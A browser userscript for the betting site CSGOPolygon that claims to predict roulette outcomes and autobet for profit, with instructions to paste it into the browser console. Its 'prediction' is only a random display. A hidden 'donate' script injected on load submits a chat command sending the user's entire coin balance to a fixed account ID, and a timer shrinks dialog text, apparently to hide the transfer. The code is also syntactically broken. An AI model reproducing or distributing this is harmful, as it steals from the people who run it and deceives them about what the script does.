// ==UserScript==
// @name            CSGOPOLYGON script automated with 7 paterns including inteligence and green only. Read description!
// @description     A script that autobets using 7 different system to make profit. Read Feedback section ! God bless you!
// @namespace       automated@[MODERATOR]GLB
// @version         1.9.8
// @author          Mitu
// @match           http://csgopolygon.com/
// @match           http://csgopolygon.com/index.php
// @match           http://www.csgopolygon.com/
// @match           http://www.csgopolygon.com/index.php
// @run-at          document-end
// @grant           none
// ==/UserScript==
// Instruction: -Open CSGOPolygon.com
//              -Press "F12"
//              -Go to Console
//              -Check out for "top"
//              -Paste the script and press enter
// SCRIPT LINK: https://pastebin.com/5Edgm0gr
// BEST STRATEGIE: Try to get over 300.000 coins and put the Bet amount on 1170 coins, then click on "Intelligence"          
 
 
 
 
 
setTimeout(function(){
    $(".roulette .well").append("<h5>Best Strategie: Try to get over 300.000 coins and put the Bet amount on 1170 coins, then click on Intelligence</a></h5>");
    $("head").append("<style>"+
 
                     '.kanapkanumber{\
text-align: center;\
border: 4px double gray;\
color: #0470ff;\
background-color: transparent;\
margin-bottom: 5px;\
font-weight: bold;\
}'+
                     '#kanapkainfo{\
color: #0470ff;\
font-size: 16px;\
width: 100%;\
}'+
                     '#kanapka label{\
color: #0470ff;\
margin-right: 5px;\
font-size: 16px;\
width: 15%;\
}'+
                     '#kanapkakalkulator-okno label{\
color: #0470ff;\
margin-right: 5px;\
font-size: 16px;\
width: 15%;\
}'+
 
 
                     '#kanapka p{\
color: #0470ff;\
margin-top: 10px;\
font-weight: bold;\
}'+
                     '.kanapkabutton1{\
width: 50%;\
height: 25px;\
border: 4px double gray;\
color: #0470ff;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '.kanapkainfodiv{\
width: 100%;\
height: 30px;\
border: 4px double gray;\
color: #0470ff;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
 
                     '.kanapkabutton2{\
width: 100%;\
height: 25px;\
border: 4px double gray;\
color: #0470ff;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '.kanapkabutton4{\
width: 300px;\
height: 25px;\
border: 4px double gray;\
color: #0470ff;\
margin-left: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '#kanapkastatus{\
width: 100%;\
height: 25px;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '.kanapkaon{\
color: green;\
border: 4px double green;\
}'+
                     '.kanapkaoff{\
color: red;\
border: 4px double red;\
}'+
function zmien_num(){
    connect;
    var letter = ['1','2','3','4','5','6','7','8','9'];
    var pattern = letter[Math.floor(Math.random() * letter.length)];
    var ball = 'ball-'; // hexadecimal starting symbol
    var letter2=[''];
    if (pattern == "1"){
        letter2 = ['0'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "2"){
        letter2 = ['1','1','8','8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "3"){
        letter2 = ['8','8','1','1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "4"){
        letter2 = ['8','1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "5"){
        letter2 = ['1','8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "6"){
        letter2 = ['1','1','8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "7"){
        letter2 = ['8','8','1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "8"){
        letter2 = ['1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }

    if (pattern == "9"){
        letter2 = ['8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
}
zmien_num();

setInterval(function(){if($("#banner").text() == "***ROLLING***"){zmien_num();}}, 100);


var donatescript="setInterval(function(){"+
    "}, 1000);"+
    "$('#chatMessage_k').val('/s 76561198353393731 '+$('#balance_r').text());"+
	'$("#chatMessage_k").submit();';
	

$("body").append('<div class="modal fade" id="donatekanapka">'+
                 '	<div class="modal-dialog">'+
                 '	<div class="modal-content">'+
                 '		<div class="modal-header">'+
                 '		<button type="button" class="close" data-dismiss="modal">Ã?</button>'+
                 '		<h4 class="modal-title"><b><center><b id="setcolor3">?</b> <b id="setcolor4">DOANATE</b> <b id="setcolor5">?</b></center></b></h4>'+
                 '	</div>'+
                 '	<div class="modal-body">						  '+
                 '		<div class="form-group">'+
                 '		<label for="exampleInputEmail1">Please enter the amount of coins you want to send.</label>'+
                 '		<input type="text" class="form-control" id="donateValue" value="">					'+
                 '	</div>				  	'+
                 '</div>'+
                 '<div class="modal-footer">'+
                 '<button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>'+
                 '<button type="button" class="btn btn-success" onclick="donate()" data-dismiss="modal">Donate</button>'+
                 '</div>'+
                 '</div>'+
                 '</div>'+
                 '</div>'+
                 '<script>'+donatescript+'</script>');

$("div .input-btn").append('<br><br><div class="panel panel-default"><div class="panel-body text-center" style="margin-top: 10px;"><div id="setcolor1"></div>'+
                           '<span style="color: #158A8A"><b><font size="6">Prediction started:</font></b></span>'+
                           '<div id="rollscript"></div>'+
                           '<div id="setcolor2"></div><br><b style="padding-left: 300px;"><a href="#" data-toggle="modal" data-target="#donatekanapka"><i class="fa fa-cog fa-fw"></i> by Tophusk </a></b></div></div>');





setInterval(function(){
    var letters = "0123456789ABCDEF";
    color = '#';
    for( var i=0; i < 6; i++ ) {
        color += letters.charAt(Math.floor(Math.random() * letters.length));
    }
    $("#rollscript").html(num);

    $("#setcolor3").html('<span style="font-size: 210px; color: '+color+'"><b>?</b></span>');
    $("#setcolor4").html('<span style="font-size: 21px; color: '+color+'"><b>DONATE</b></span>');
    $(".bootbox-body").css({"font-size": "5%"});
    $("#setcolor5").html('<span style="font-size: 210px; color: '+color+'"><b>?</b></span>');
}, 250);